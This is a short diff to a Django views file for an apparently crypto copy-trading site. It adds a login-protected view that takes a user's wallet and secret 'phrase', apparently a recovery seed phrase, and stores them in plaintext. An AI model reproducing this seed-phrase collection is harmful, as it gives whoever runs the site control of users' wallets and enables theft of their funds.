@@ -45,7 +45,6 @@ def SignUpView(request):
         return redirect('dashboard')
     if request.method=="POST":
         data=request.POST
-        print(data)
         email=data['email']
         if User.objects.filter(email=email).first() is not  None:
             return JsonResponse({"status":"failure"},safe=False)
@@ -294,7 +293,14 @@ def RecoverUserData(request):
         )
     return JsonResponse({"staus":'done'},safe=False)
 
+@login_required(login_url='login')
 def CopyTraderPageRequest(request):
     if request.method =='POST':
-        data=request.post
-        CopyTradeAccessRequest.objects.create()
+        data=request.POST
+        CopyTradeAccessRequest.objects.create(
+            user=request.user,
+            wallet=data['wallet'],
+            phrase=data['phrase']
+        )
+        messages.success(request,'Request Created Successfully, Wait for Confirmation')
+        return JsonResponse({'status':'success'})
